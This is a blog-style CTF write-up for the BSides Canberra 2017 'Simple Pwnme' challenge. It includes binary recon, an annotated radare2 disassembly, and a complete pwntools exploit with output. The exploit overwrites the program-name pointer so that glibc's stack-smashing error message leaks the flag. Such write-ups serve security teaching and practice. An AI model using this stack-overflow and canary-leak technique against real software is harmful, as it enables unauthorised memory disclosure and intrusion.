---
layout: post
title: "BSides Canberra 2017 CTF - Pwnables - Simple Pwnme (150pts)"
description: "BSides Canberra 2017 CTF - Pwnables - Simple Pwnme Write-up"
category: ctf, bsides_canberra_2017, pwnable, simple_pwnme, exploit, write-up
tags: [ctf, bsides_canberra_2017, pwnable, simple_pwnme, exploit. write-ups]
---

Last week I attended BSides Canberra, unfortunately I didn't spend much times playing the CTF but collected the challenges to try later. I'll be posting write-ups as I solve the CTF challenges. OJ has a [blog post](http://buffered.io/posts/bsidescbr-ctf-round-up/) summarizing what was involed in the CTF.

### Original description: ###
```text
Simple Pwnme (150pts)

It's a beginner challenge, so it can't be that hard, right?

nc pwn.shell.dance 6000

noob_download 8978d1ee9042ae95c35c159bc133c591
```

### Recon ###

Initial analysis shows that the file is a 64bit linux elf binary
```shell
vagrant@vagrant-ubuntu-trusty-64:~/host-share/bsides$ file noob_download
noob_download: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=4f4bee3f353654b6ab1343af0af59bf888cc21dc, not stripped
```

The binary doesn't have any external dependeciess besides libc
```shell
vagrant@vagrant-ubuntu-trusty-64:~/host-share/bsides$ ldd noob_download
linux-vdso.so.1 =>  (0x00007fffc7f3f000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9156594000)
/lib64/ld-linux-x86-64.so.2 (0x00007f9156959000)
```

Running strings against the challenge binary returns a few interesting strings. We can see that the flag is compiled into the binary.
The binary makes calls to fgets, fflush and fwrite. There appears to be a few prompts ("Gimme the data:" and "Go on then, break me:").

```
vagrant@vagrant-ubuntu-trusty-64:~/host-share/bsides$ strings noob_download
/lib64/ld-linux-x86-64.so.2
?56T
libc.so.6
fflush
__stack_chk_fail
stdin
fgets
stdout
fwrite
__libc_start_main
__gmon_start__
GLIBC_2.4
GLIBC_2.2.5
AWAVA
AUATL
[]A\A]A^A_
BSIDES_CTF{FLAGISHEREONTHESERVER!}
Gimme the data:
Go on then, break me:
---8<---
```

The binary has a few security features enabled. It has stack canaries, NX, and RELRO
We can't execute code on the stack but we can still rop.
We'll have to either leak the stack canaries or do something else.
We don't have to worry about aslr which is nice.

```
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : FULL
```

Considering the flag is in the binary it appears we have to leak the flag or execute code with rop and bypass stack canaries to retrieve the binary on the server.
After researching for a bit I found the following past CTF writeups and walkthroughs which allowed me to solve the challenge:
* [32c3 CTF - readme](https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/readme-200)
* [EKOPARTY PRE-CTF 2015 - Smashing the stack for fun and profit](https://github.com/ctfs/write-ups-2015/tree/master/ekoparty-pre-ctf-2015/pwn/smashing-the-stack-for-fun-and-profit)
* <div markdown = "0"><iframe width="480" height="270" src="https://www.youtube.com/embed/wLsckMfScOg"></iframe></div>

The fundamental flaw we are exploiting is in libc's [stack smashing protection](http://seclists.org/bugtraq/2010/Apr/243) which allows us to leak information if we can overwrite the program's name pointer.

### Disassembly of the binary ###

```shell
vagrant@vagrant-ubuntu-trusty-64:~/host-share/bsides/completed/noob_download$ radare2  noob_download
 -- Save your projects with 'Ps <project-filename>' and restore then with 'Po <project-filename>'
[0x00400590]> aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Emulate code to find computed references (aae)
[x] Analyze consecutive function (aat)
[aav: using from to 0x400000 0x4021f0
Using vmin 0x400000 and vmax 0x601060
aav: using from to 0x400000 0x4021f0
Using vmin 0x400000 and vmax 0x601060
[x] Analyze value pointers (aav)
[Deinitialized mem.0x100000_0xf0000 functions (afta)unc.* functions (aan)
[x] Type matching analysis for all functions (afta)
[x] Type matching analysis for all functions (afta)
[0x00400590]> pdf @ main
            ;-- main:
/ (fcn) sym.main 200
|   sym.main ();
|           ; var int local_38h @ rbp-0x38
|           ; var int local_30h @ rbp-0x30
|           ; var int local_24h @ rbp-0x24
|           ; var int local_20h @ rbp-0x20
|           ; var int local_8h @ rbp-0x8
|              ; DATA XREF from 0x004005ad (entry0)
|           0x00400686      55             push rbp
|           0x00400687      4889e5         mov rbp, rsp
|           0x0040068a      4883ec40       sub rsp, 0x40
|           0x0040068e      897ddc         mov dword [rbp - local_24h], edi
|           0x00400691      488975d0       mov qword [rbp - local_30h], rsi
|           0x00400695      488955c8       mov qword [rbp - local_38h], rdx
|           0x00400699      64488b042528.  mov rax, qword fs:[0x28]         ;Read a random value
|           0x004006a2      488945f8       mov qword [rbp - local_8h], rax  ;Save the random value onto the stack as a stack canary
|           0x004006a6      31c0           xor eax, eax
|           0x004006a8      488b05710920.  mov rax, qword [obj.stdout] ; [0x601020:8]=0x3620746148206465
|           0x004006af      4889c1         mov rcx, rax                ; FILE *stream
|           0x004006b2      ba10000000     mov edx, 0x10               ; size_t nitems
|           0x004006b7      be01000000     mov esi, 1                  ; size_t size
|           0x004006bc      bf23084000     mov edi, str.Gimme_the_data: ; "Gimme the data: " @ 0x400823 ; const void *ptr
|           0x004006c1      e8c2feffff     call sub.fwrite_248_588    ; Print the message "Gimme the data: "
|           0x004006c6      488b05530920.  mov rax, qword [obj.stdout] ; [0x601020:8]=0x3620746148206465 ; LEA obj.stdout ; "ed Hat 6.2.1-2)" @ 0x601020
|           0x004006cd      4889c7         mov rdi, rax                ; FILE *stream
|           0x004006d0      e8abfeffff     call sub.fflush_240_580    ; Flush the message to stdout
|           0x004006d5      488b05540920.  mov rax, qword [obj.stdin]  ; [0x601030:8]=0x4e4728203a434347 rdx ; LEA obj.stdin ; "GCC: (GNU) 6.3.1 20161221 (Red Hat 6.3.1-1)" @ 0x601030
|           0x004006dc      4889c2         mov rdx, rax                ; FILE *stream
|           0x004006df      be20000000     mov esi, 0x20 ; "@" 0x00000020  ; "@" ; int size
|           0x004006e4      bf40106000     mov edi, obj.whateva        ; Save the user input into the whateva variable
|           0x004006e9      e882feffff     call sub.fgets_224_570     ; Read input from the user
|           0x004006ee      488b052b0920.  mov rax, qword [obj.stdout] ; [0x601020:8]=0x3620746148206465 ; LEA obj.stdout ; "ed Hat 6.2.1-2)" @ 0x601020
|           0x004006f5      4889c1         mov rcx, rax                ; FILE *stream
|           0x004006f8      ba16000000     mov edx, 0x16               ; size_t nitems
|           0x004006fd      be01000000     mov esi, 1                  ; size_t size
|           0x00400702      bf34084000     mov edi, str.Go_on_then__break_me: ; "Go on then, break me: " @ 0x400834 ; const void *ptr
|           0x00400707      e87cfeffff     call sub.fwrite_248_588    ; Print the message "Go on then, break me: "
|           0x0040070c      488b050d0920.  mov rax, qword [obj.stdout] ; [0x601020:8]=0x3620746148206465 ; LEA obj.stdout ; "ed Hat 6.2.1-2)" @ 0x601020
|           0x00400713      4889c7         mov rdi, rax                ; FILE *stream
|           0x00400716      e865feffff     call sub.fflush_240_580    ; Flush the message to stdout
|           0x0040071b      488b150e0920.  mov rdx, qword [obj.stdin]  ; [0x601030:8]=0x4e4728203a434347 rdx ; LEA obj.stdin ; "GCC: (GNU) 6.3.1 20161221 (Red Hat 6.3.1-1)" @ 0x601030 ; FILE *stream
|           0x00400722      488d45e0       lea rax, [rbp - local_20h]
|           0x00400726      be90010000     mov esi, 0x190              ; int size
|           0x0040072b      4889c7         mov rdi, rax                ; char *s
|           0x0040072e      e83dfeffff     call sub.fgets_224_570     ; Read user input
|           0x00400733      b800000000     mov eax, 0
|           0x00400738      488b4df8       mov rcx, qword [rbp - local_8h]
|           0x0040073c      6448330c2528.  xor rcx, qword fs:[0x28]     ;Check if the stack canary has been changed
|       ,=< 0x00400745      7405           je 0x40074c                  ;If the stack canary values are the same, exit normally
|       |   0x00400747      e814feffff     call sub.__stack_chk_fail_208_560void)   ; Goto the stack check failed function if the stack canary does not match
|       `-> 0x0040074c      c9             leave
\           0x0040074d      c3             ret
```

Starting the challenge binary and bind to tcp 6000 to simulated the challenge server
```shell
vagrant@vagrant-ubuntu-trusty-64:~/host-share/bsides$ socat TCP-LISTEN:6000,reuseaddr,fork EXEC:"./noob_download"
```

### TODO: Document the exploit development process ###

### Final working exploit ###
```python
#!/usr/bin/env python2
#from IPython import embed #for debugging during exploit development
from pwn import *

#Completely unneeded but why not
def asciipadding(asciiart=None, length=0):
    asciipaddingstring = ''
    for i in range(length):
        asciipaddingstring += asciiart[i%(len(asciiart))]
    return asciipaddingstring

noob_download_bin = ELF('noob_download')
#Not used:
#rop = ROP(noob_download_bin)
if args['REMOTE']:
        noob_download = remote('pwn.shell.dance', 6000)
else:
        noob_download = process('noob_download')

#Target information
context.update(arch='amd64', os='linux')

#Some variables
flag = noob_download_bin.symbols['flag']
whateva = noob_download_bin.symbols['whateva']
libc_fatal_stderr = 'LIBC_FATAL_STDERR_=0\x00'
payload_padding = 264
payload  = ''

#GDB attach code block
"""
gdb.attach(noob_download, '''
set disassembly-flavor intel
break *main+104 #Break at the first fgets
break *main+173 #Break at the second fgets
''')
"""

#Generating the payload
log.info("Payload padding - %d bytes" % payload_padding)
#Choose your padding:
#payload += 'A' * 264
#payload += cyclic(264)
payload += asciipadding('~=[,,_,,]:3 ', payload_padding) #Why not nyan cat
log.info("Address of flag - 0x%x" % flag)
payload += p64(flag)
log.info("Address of user input - 0x%x" % whateva)
payload += p64(whateva)
log.info("Final generated payload:")
log.hexdump(payload)

#Performing the actual exploit:
log.info("Starting communication with server")
log.info(noob_download.recvuntil(': '))
log.info("Sending string which redirects libc's errors to stdout - %s" % libc_fatal_stderr)
noob_download.sendline(libc_fatal_stderr)
log.info(noob_download.recvuntil(': '))
log.info("Sending generated payload")
noob_download.sendline(payload)
log.info(noob_download.recvuntil('***: '))
log.success("Flag found: %s" % noob_download.recvuntil(' '))
log.info(noob_download.recvall())
```

### Exploit output ###

```shell
vagrant@vagrant-ubuntu-trusty-64:~/host-share/bsides/completed/noob_download$ ./noob_download-exploit.py
[!] Couldn't find relocations against PLT to get symbols
[*] '/home/vagrant/host-share/bsides/completed/noob_download/noob_download'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
[+] Starting local process './noob_download': Done
[*] Payload padding - 264 bytes
[*] Address of flag - 0x400800
[*] Address of user input - 0x601040
[*] Final generated payload:
[*] 00000000  7e 3d 5b 2c  2c 5f 2c 2c  5d 3a 33 20  7e 3d 5b 2c  │~=[,│,_,,│]:3 │~=[,│
    00000010  2c 5f 2c 2c  5d 3a 33 20  7e 3d 5b 2c  2c 5f 2c 2c  │,_,,│]:3 │~=[,│,_,,│
    00000020  5d 3a 33 20  7e 3d 5b 2c  2c 5f 2c 2c  5d 3a 33 20  │]:3 │~=[,│,_,,│]:3 │
    00000030  7e 3d 5b 2c  2c 5f 2c 2c  5d 3a 33 20  7e 3d 5b 2c  │~=[,│,_,,│]:3 │~=[,│
    00000040  2c 5f 2c 2c  5d 3a 33 20  7e 3d 5b 2c  2c 5f 2c 2c  │,_,,│]:3 │~=[,│,_,,│
    00000050  5d 3a 33 20  7e 3d 5b 2c  2c 5f 2c 2c  5d 3a 33 20  │]:3 │~=[,│,_,,│]:3 │
    00000060  7e 3d 5b 2c  2c 5f 2c 2c  5d 3a 33 20  7e 3d 5b 2c  │~=[,│,_,,│]:3 │~=[,│
    00000070  2c 5f 2c 2c  5d 3a 33 20  7e 3d 5b 2c  2c 5f 2c 2c  │,_,,│]:3 │~=[,│,_,,│
    00000080  5d 3a 33 20  7e 3d 5b 2c  2c 5f 2c 2c  5d 3a 33 20  │]:3 │~=[,│,_,,│]:3 │
    00000090  7e 3d 5b 2c  2c 5f 2c 2c  5d 3a 33 20  7e 3d 5b 2c  │~=[,│,_,,│]:3 │~=[,│
    000000a0  2c 5f 2c 2c  5d 3a 33 20  7e 3d 5b 2c  2c 5f 2c 2c  │,_,,│]:3 │~=[,│,_,,│
    000000b0  5d 3a 33 20  7e 3d 5b 2c  2c 5f 2c 2c  5d 3a 33 20  │]:3 │~=[,│,_,,│]:3 │
    000000c0  7e 3d 5b 2c  2c 5f 2c 2c  5d 3a 33 20  7e 3d 5b 2c  │~=[,│,_,,│]:3 │~=[,│
    000000d0  2c 5f 2c 2c  5d 3a 33 20  7e 3d 5b 2c  2c 5f 2c 2c  │,_,,│]:3 │~=[,│,_,,│
    000000e0  5d 3a 33 20  7e 3d 5b 2c  2c 5f 2c 2c  5d 3a 33 20  │]:3 │~=[,│,_,,│]:3 │
    000000f0  7e 3d 5b 2c  2c 5f 2c 2c  5d 3a 33 20  7e 3d 5b 2c  │~=[,│,_,,│]:3 │~=[,│
    00000100  2c 5f 2c 2c  5d 3a 33 20  00 08 40 00  00 00 00 00  │,_,,│]:3 │··@·│····│
    00000110  40 10 60 00  00 00 00 00                            │@·`·│····││
    00000118
[*] Starting communication with server
[*] Gimme the data:
[*] Sending string which redirects libc's errors to stdout - LIBC_FATAL_STDERR_=0\x00
[*] Go on then, break me:
[*] Sending generated payload
[*] *** stack smashing detected ***:
[+] Flag found: BSIDES_CTF{FLAGISHEREONTHESERVER!}
[+] Receiving all data: Done (11B)
[*] Process './noob_download' stopped with exit code -6
[*] terminated
```
### Final thoughts ###
Since I'm completing this after the event, I don't know what the actual flag was but the exploit should work against the actual challenge server. This challenge really forced me to improve my exploit developement skills and I walked away from this challenge learning something new.
